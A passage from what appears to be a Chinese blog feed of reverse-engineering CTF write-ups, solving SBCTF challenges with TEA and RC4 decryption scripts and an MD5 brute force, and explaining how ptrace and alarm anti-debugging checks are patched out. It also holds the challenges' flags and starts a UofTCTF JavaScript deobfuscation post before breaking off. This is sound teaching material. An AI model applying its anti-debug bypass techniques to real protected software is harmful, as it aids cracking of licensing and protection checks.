$r0;<br>        java.io.PrintStream $r2, $r11, $r12;<br>        java.io.BufferedReader $r3;<br>        java.io.InputStreamReader $r4;<br>        java.io.InputStream $r5;<br>        java.lang.String $r7;<br>        byte[] $r8, r10, r16;<br>        boolean $z0;<br>        java.io.IOException $r13;<br>        java.lang.RuntimeException $r14;<br>        java.lang.String[] r15;<br><br>        r15 := @parameter0: java.lang.String[];<br><br>        $r0 = newarray (int)[4];<br><br>        $r0[0] = 1732584193;<br><br>        $r0[1] = -271733879;<br><br>        $r0[2] = -1732584194;<br><br>        $r0[3] = 271733878;<br><br>        $r2 = &lt;java.lang.System: java.io.PrintStream out&gt;;<br><br>        virtualinvoke $r2.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;please input your flag:&quot;);<br><br>        $r3 = new java.io.BufferedReader;<br><br>        $r4 = new java.io.InputStreamReader;<br><br>        $r5 = &lt;java.lang.System: java.io.InputStream in&gt;;<br><br>        specialinvoke $r4.&lt;java.io.InputStreamReader: void &lt;init&gt;(java.io.InputStream)&gt;($r5);<br><br>        specialinvoke $r3.&lt;java.io.BufferedReader: void &lt;init&gt;(java.io.Reader)&gt;($r4);<br><br>     label1:<br>        $r7 = virtualinvoke $r3.&lt;java.io.BufferedReader: java.lang.String readLine()&gt;();<br><br>        r16 = virtualinvoke $r7.&lt;java.lang.String: byte[] getBytes()&gt;();   //得到输入为字节型<br><br>        $r8 = newarray (byte)[24];<br><br>        $r8[0] = 73;<br><br>        $r8[1] = -65;<br><br>        $r8[2] = 27;<br><br>        $r8[3] = -19;<br><br>        $r8[4] = -77;<br><br>        $r8[5] = 28;<br><br>        $r8[6] = 108;<br><br>        $r8[7] = 82;<br><br>        $r8[8] = 43;<br><br>        $r8[9] = 60;<br><br>        $r8[10] = -14;<br><br>        $r8[11] = 58;<br><br>        $r8[12] = 28;<br><br>        $r8[13] = 44;<br><br>        $r8[14] = -21;<br><br>        $r8[15] = 77;<br><br>        $r8[16] = 31;<br><br>        $r8[17] = 114;<br><br>        $r8[18] = 43;<br><br>        $r8[19] = 98;<br><br>        $r8[20] = 88;<br><br>        $r8[21] = 17;<br><br>        $r8[22] = 23;<br><br>        $r8[23] = -9;<br><br>        r10 = staticinvoke &lt;simple: byte[] method3(byte[],int[])&gt;(r16, $r0);              // 对输入加密<br><br>        $z0 = staticinvoke &lt;java.util.Arrays: boolean equals(byte[],byte[])&gt;(r10, $r8);   // 验证输入<br><br>        if $z0 == 0 goto label2;<br><br>        $r12 = &lt;java.lang.System: java.io.PrintStream out&gt;;<br><br>        virtualinvoke $r12.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;right flag!&quot;);<br><br>        goto label3;<br><br>     label2:<br>        $r11 = &lt;java.lang.System: java.io.PrintStream out&gt;;<br><br>        virtualinvoke $r11.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;wrong flag!&quot;);<br><br>     label3:<br>        goto label5;<br><br>     label4:<br>        $r13 := @caughtexception;<br><br>        $r14 = new java.lang.RuntimeException;<br><br>        specialinvoke $r14.&lt;java.lang.RuntimeException: void &lt;init&gt;(java.lang.Throwable)&gt;($r13);<br><br>        throw $r14;<br><br>     label5:<br>        return;<br><br>        catch java.io.IOException from label1 to label3 with label4;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v1: c_int32, v2: c_int32, key: <span class="hljs-built_in">list</span></span>):<br>    delta = c_int32(-<span class="hljs-number">1640531527</span> * <span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v2.value -= ((v1.value &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">2</span>].value) ^ (v1.value + delta.value) ^ ((v1.value &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>].value)<br>        v1.value -= ((v2.value &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">0</span>].value) ^ (v2.value + delta.value) ^ ((v2.value &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>].value)<br>        delta.value += <span class="hljs-number">1640531527</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(((v1.value &lt;&lt; (<span class="hljs-number">8</span> * i)) &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(((v2.value &lt;&lt; (<span class="hljs-number">8</span> * i)) &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br>cipher = [<span class="hljs-number">73</span>, -<span class="hljs-number">65</span>, <span class="hljs-number">27</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">77</span>, <span class="hljs-number">28</span>, <span class="hljs-number">108</span>, <span class="hljs-number">82</span>, <span class="hljs-number">43</span>, <span class="hljs-number">60</span>, -<span class="hljs-number">14</span>, <span class="hljs-number">58</span>, <span class="hljs-number">28</span>, <span class="hljs-number">44</span>, -<span class="hljs-number">21</span>, <span class="hljs-number">77</span>, <span class="hljs-number">31</span>, <span class="hljs-number">114</span>, <span class="hljs-number">43</span>, <span class="hljs-number">98</span>, <span class="hljs-number">88</span>, <span class="hljs-number">17</span>, <span class="hljs-number">23</span>, -<span class="hljs-number">9</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>    cipher[i] = c_uint8(cipher[i])<br><br><br>key = [c_int32(<span class="hljs-number">1732584193</span>), c_int32(-<span class="hljs-number">271733879</span>), c_int32(-<span class="hljs-number">1732584194</span>), c_int32(<span class="hljs-number">271733878</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">8</span>):<br>    v1 = (cipher[i + <span class="hljs-number">0</span>].value &lt;&lt; <span class="hljs-number">24</span>) | (cipher[i + <span class="hljs-number">1</span>].value &lt;&lt; <span class="hljs-number">16</span>) | (cipher[i + <span class="hljs-number">2</span>].value &lt;&lt; <span class="hljs-number">8</span>) | cipher[i + <span class="hljs-number">3</span>].value<br>    v2 = (cipher[i + <span class="hljs-number">0</span> + <span class="hljs-number">4</span>].value &lt;&lt; <span class="hljs-number">24</span>) | (cipher[i + <span class="hljs-number">1</span> + <span class="hljs-number">4</span>].value &lt;&lt; <span class="hljs-number">16</span>) | (cipher[i + <span class="hljs-number">2</span> + <span class="hljs-number">4</span>].value &lt;&lt; <span class="hljs-number">8</span>) | cipher[<br>        i + <span class="hljs-number">3</span> + <span class="hljs-number">4</span>].value<br>    decrypt(c_int32(v1), c_int32(v2), key)<br><br><span class="hljs-comment"># SBCTF&#123;have_fun_with_tea&#125;</span><br></code></pre></td></tr></table></figure><h2 id="babysmc"><a href="#babysmc" class="headerlink" title="babysmc"></a>babysmc</h2><p>ESP定律脱壳，然后简单SMC，下断点在函数处，然后使用<code>p</code>让IDA重新分析为函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">3776109546</span>, <span class="hljs-number">4260205215</span>, <span class="hljs-number">116586236</span>, <span class="hljs-number">4076271869</span>, <span class="hljs-number">4093020152</span>, <span class="hljs-number">4059887356</span>, <span class="hljs-number">251038144</span>, <span class="hljs-number">4140300481</span>, <span class="hljs-number">130517195</span>,<span class="hljs-number">150898624</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    a[i] ^= <span class="hljs-number">0x87654321</span><br>    a[i] -= <span class="hljs-number">305419896</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i] &gt;&gt; (<span class="hljs-number">8</span>*k))&amp;<span class="hljs-number">0xff</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># SBCTF&#123;The_code_can_be_edit_when_running&#125;</span><br></code></pre></td></tr></table></figure><h2 id="babyhash"><a href="#babyhash" class="headerlink" title="babyhash"></a>babyhash</h2><p>题目先要求输入6个key，并要求为小写字符</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2002.29.10.png" style="zoom:50%;" /><p>然后与字符串<code>12345</code>进行拼接操作</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2002.33.08.png" style="zoom:50%;" /><p>然后进行一系列操作，每个函数都有很多个调用，直接从最后面的比较看起</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2002.35.43.png" alt="截屏2024-01-19 02.35.43" style="zoom:50%;" /><p>跟入<code>sub_7FF618207E04</code>，然后一直跟入到<code>sub_7FF6182175F0</code></p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2002.38.50.png" alt="截屏2024-01-19 02.38.50" style="zoom:50%;" /><p>其中函数<code>sub_7FF6182061FD</code>最终只是调用<code>memcmp</code>函数进行比较，因此这里就是输入的key和正确的key进行比较的地方，查看比较的两个参数</p><blockquote><p>a1 是输入的密文 6d6eaa76a827ebae246617c27107c8dd</p><p>a3 是真正的密文 f27d71f53ae17679fb352baa5ea326db</p></blockquote><p>这两个看起来很像是hash后的值，结合题目信息，用一些md5进行尝试计算</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2002.44.02.png" alt="截屏2024-01-19 02.44.02" style="zoom:40%;" /><p>发现真正用来md5的是<code>12345aaaaaa67890</code>,也就是输入的六位key会和<code>12345</code>以及<code>67890</code>进行拼接，那么直接进行爆破得到真正的key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># f27d71f53ae17679fb352baa5ea326db</span><br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> hashlib<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_md5</span>(<span class="hljs-params">string</span>):<br>    md5_val = hashlib.md5(string.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">return</span> md5_val<br><br><br><span class="hljs-comment"># print(string_to_md5(&#x27;12345aaaaaa67890&#x27;))</span><br><br>pre = <span class="hljs-string">&#x27;12345&#x27;</span><br>suf = <span class="hljs-string">&#x27;67890&#x27;</span><br>table = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> itertools.product(table, repeat=<span class="hljs-number">6</span>):<br>    mid = <span class="hljs-string">&#x27;&#x27;</span>.join(s)<br>    key = pre + mid + suf<br>    md5_val = string_to_md5(key)<br><br><br>    <span class="hljs-keyword">if</span> md5_val == <span class="hljs-string">&#x27;f27d71f53ae17679fb352baa5ea326db&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(mid)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment"># maikei</span><br></code></pre></td></tr></table></figure><p>在得到key后继续往后审计</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2002.47.07.png" alt="截屏2024-01-19 02.47.07" style="zoom:50%;" /><p>关键只有两处，<code>sub_7FF618208C4B</code>这个函数对输入进行加密，72行处的if语句对输入进行判断</p><p>查看加密函数，发现就是普通的RC4加密，密钥则是<code>12345maikei67890</code></p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2002.48.45.png" alt="截屏2024-01-19 02.48.45" style="zoom:45%;" /><p>直接解密即可</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2002.50.19.png" alt="截屏2024-01-19 02.50.19" style="zoom:40%;" /><h2 id="babydecode"><a href="#babydecode" class="headerlink" title="babydecode"></a>babydecode</h2><p>题目用到两个反调试手段</p><p>第一个是在函数<code>sub_401F7B</code>中调用<code>Ptrace</code>函数进行反调试，许多调试器的功能都是基于<code>ptrace</code>这一个强大的系统调用实现，但是一个进程在同一时间只能被另外一个进程调试，那么这个程序就可以调用<code>ptrace</code>函数来调试自己，如果失败，说明有进程在调试自己。这一个<a href="https://zhuanlan.zhihu.com/p/653385264">教程</a>是十分清晰的解释了这个函数使用。</p><blockquote><ol><li>ptrace PTRACE_ATTACH可以附加到目标进程上，对其进行调试。</li><li>反调试的方式<br> 跟踪自己：因为，一个进程在同一时间只能被一个进程跟踪。如果进程在启动时，就调用ptrace PTRACE_TRACEME跟踪了自己。那么这个进程将无法被其他进程附加</li></ol></blockquote><p>将两个if条件patch一下就可以绕过</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2016.03.52.png" alt="截屏2024-01-19 16.03.52" style="zoom:50%;" /><p>还有一处反调试是使用<code>sys_alram</code>这一函数，通过字符串查找很容易到相关地方。</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2016.12.46.png" alt="截屏2024-01-19 16.12.46" style="zoom:50%;" /><p>这里绕过方式也很多，可以修改时间，或者直接nop掉函数。</p><p>完成patch后就可以正常调试。</p><p>整体加密流程也很简单，先是正常TEA算法加密，然后进行一个BASE64的变表处理，然后用所得Base64加密后在一个新表里面找索引，最终的索引为密文</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2016.15.06.png" alt="截屏2024-01-19 16.15.06" style="zoom:50%;" /><p>现在中间变量都可以通过调试正常正确拿到</p><p>得到Base加密</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">enc</span> = [75, 254, 150, 14, 254, 98, 236, 207, 133, 254, 95, 172, 115, 223, 95, 27, 226, 197, 180, 210, 177, 117, 120, 53, 190, 89, 172, 28, 53, 199, 183, 226, 183, 55, 137, 18, 207, 49, 230, 249, 75, 133, 137, 168]<br><br><span class="hljs-keyword">table</span> = [156, 131, 136, 132, 13, 148, 144, 58, 207, 254, 152, 212, 1, 40, 84, 137, 53, 125, 54, 130, 5, 166, 184, 15, 82, 43, 93, 80, 99, 91, 141, 63, 72, 2, 108, 217, 201, 192, 8, 51, 203, 90, 26, 14, 142, 39, 206, 234, 251, 56, 220, 60, 231, 105, 250, 101, 248, 237, 127, 29, 20, 216, 77, 138, 246, 124, 211, 229, 228, 145, 165, 95, 173, 196, 41, 76, 214, 28, 208, 123, 172, 46, 255, 18, 223, 3, 78, 164, 149, 52, 65, 198, 181, 179, 167, 48, 47, 16, 85, 4, 188, 178, 204, 122, 186, 6, 253, 128, 175, 195, 96, 87, 174, 92, 191, 112, 109, 98, 199, 10, 67, 73, 37, 222, 239, 0, 12, 45, 50, 243, 236, 19, 160, 104, 187, 232, 59, 88, 129, 194, 155, 162, 230, 140, 159, 126, 176, 35, 221, 213, 111, 119, 185, 17, 71, 235, 33, 161, 244, 36, 31, 205, 197, 245, 182, 249, 219, 163, 61, 44, 83, 157, 110, 106, 27, 134, 24, 55, 200, 146, 114, 42, 177, 86, 147, 169, 11, 21, 154, 133, 81, 247, 69, 135, 218, 209, 227, 89, 75, 57, 23, 34, 139, 224, 180, 66, 116, 117, 143, 193, 74, 153, 183, 252, 9, 241, 158, 202, 168, 70, 121, 62, 226, 97, 30, 7, 103, 238, 150, 38, 113, 107, 100, 225, 120, 22, 49, 170, 215, 32, 115, 94, 118, 242, 64, 25, 189, 151, 190, 102, 210, 240, 79, 171, 68, 233]<br><br>enc_base = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">enc</span>:<br>    enc_base.<span class="hljs-keyword">append</span>(chr(<span class="hljs-keyword">table</span>[i]))<br><br><span class="hljs-keyword">print</span>(&#x27;&#x27;.join(enc_base))<br><br># LDoTDU1uhD0npa0PgYrJ7bCiQ4nci9VgVeX6u8qfLhX=<br></code></pre></td></tr></table></figure><p>得到TEA加密</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2016.17.54.png" alt="截屏2024-01-19 16.17.54" style="zoom:50%;" /><p>最终解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v1, v2, key</span>):<br>    delta = c_uint32(-<span class="hljs-number">1640531527</span> * <span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v2.value -= (v1.value + delta.value) ^ (<span class="hljs-number">16</span> * v1.value + key[<span class="hljs-number">2</span>]) ^ ((v1.value &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>])<br>        v1.value -= (v2.value + delta.value) ^ (<span class="hljs-number">16</span> * v2.value + key[<span class="hljs-number">0</span>]) ^ ((v2.value &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>])<br>        delta.value += <span class="hljs-number">1640531527</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(((v1.value &gt;&gt; (<span class="hljs-number">8</span> * i)) &amp; <span class="hljs-number">0xff</span>)), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(((v2.value &gt;&gt; (<span class="hljs-number">8</span> * i)) &amp; <span class="hljs-number">0xff</span>)), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br>key = [<span class="hljs-number">0x55</span>, <span class="hljs-number">0x16f</span>, <span class="hljs-number">0x1e6</span>, <span class="hljs-number">0x2a0</span>]<br><br>enc_tea = [<span class="hljs-number">0x38</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x65</span>,<br>           <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x40</span>]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(enc_tea),<span class="hljs-number">8</span>):<br>    v1 = (enc_tea[i + <span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">24</span>) | (enc_tea[i + <span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">16</span>) | (enc_tea[i + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>) | enc_tea[i + <span class="hljs-number">0</span>]<br>    v2 = (enc_tea[i + <span class="hljs-number">3</span> + <span class="hljs-number">4</span>] &lt;&lt; <span class="hljs-number">24</span>) | (enc_tea[i + <span class="hljs-number">2</span> + <span class="hljs-number">4</span>] &lt;&lt; <span class="hljs-number">16</span>) | (enc_tea[i + <span class="hljs-number">1</span>+ <span class="hljs-number">4</span>] &lt;&lt; <span class="hljs-number">8</span>) | enc_tea[i + <span class="hljs-number">0</span> + <span class="hljs-number">4</span>]<br><br>    decrypt(c_uint32(v1), c_uint32(v2), key)<br><span class="hljs-comment"># SBCTF&#123;2e_easy_Anti-debug_in_ELF&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="start-main"><a href="#start-main" class="headerlink" title="start_main"></a>start_main</h2><p>程序逻辑很简单，输入36位的flag然后经过一个变表的base64解码，然后再经过一个RC4解密，通过调试可以拿到变表<code>RSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQ</code>和RC4密钥<code>lFaUmVp=</code>，其中用变表可以解RC4密钥为<code>SBCTF</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2002.21.19.png"></p><p>不过奇怪的是并没有看到密文比较的地方，先运行看看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2002.24.02.png"></p><p>是有错误的输出提示的，但是直接搜这个字符串却搜不到，看来是做了一点加密。不过这也告诉我们一个东西，即在main函数运行完后还有函数在运行，这实际上就是<code>fini_array</code>了。</p><p>简单说<code>main</code>函数并不是第一个运行的函数，第一个运行的函数应该是<code>start</code>，然后调用<code>_libc_start_main</code>，<code>_libc_start_main</code>再调用<code>main</code>函数，并且在<code>main</code>函数开始前运行<code>init_array</code>里面的函数，<code>main</code>函数结束后运行<code>fini_array</code>里面的函数。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2002.28.15.png" alt="截屏2024-01-23 02.28.15"></p><p>因此只需转过去看看<code>fini_array</code>有函数即可，在IDA中按<code>shift+F7</code>即可打开段窗口，在里面就有<code>fini_array</code>地址</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2002.31.15.png" alt="截屏2024-01-23 02.31.15"></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2002.31.34.png" alt="截屏2024-01-23 02.31.34"></p><p>发现一个函数<code>sub_55934E697E47</code>，跟过去看看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2002.32.16.png"></p><p>这就是很明显的比较流程了，这里俩函数就是解密失败成功字符串的。至此整题的流程就清楚了，当然<code>init_array</code>也有一个函数，那个函数就是起到一个变表的作用。除了这种方式找之外，也可以直接搜索输入的引用，同样能够找到这个地方</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2002.34.21.png"></p><p>最后的base解码就是猜测了，因为输入的字符会进行一个解码，那么猜测输入的字符串也应该是经过base加密的。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UofTCTF</title>
    <link href="/2024/01/17/UofTCTF_JS/"/>
    <url>/2024/01/17/UofTCTF_JS/</url>
    
    <content type="html"><![CDATA[<p>记录JS逆向以及Html&amp;Css逆向</p><span id="more"></span><h2 id="UofTCTF-2023"><a href="#UofTCTF-2023" class="headerlink" title="UofTCTF-2023"></a>UofTCTF-2023</h2><p>这里是<a href="https://github.com/UofTCTF/uoftctf-2023/tree/master/Reverse%20Engineering/Secret%20Password">题目</a></p><p>第一步首先找到关键的函数，可以先找按钮的位置，再找按钮的触发事件</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-17%2023.46.54.png" style="zoom:50%;" /><p>显然是这个<code>checkPassword</code>,<code>checkPassword</code>是被混淆了的</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-17%2023.49.39.png" alt="截屏2024-01-17 23.49.39" style="zoom:50%;" /><p>丢去这个<a href="https://deobfuscate.relative.im/">网站</a>可以解混淆，下面是混淆后的结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkPassword</span>(<span class="hljs-params">password</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span> (password.<span class="hljs-property">length</span> !== <span class="hljs-number">21</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (password.<span class="hljs-title function_">slice</span>(<span 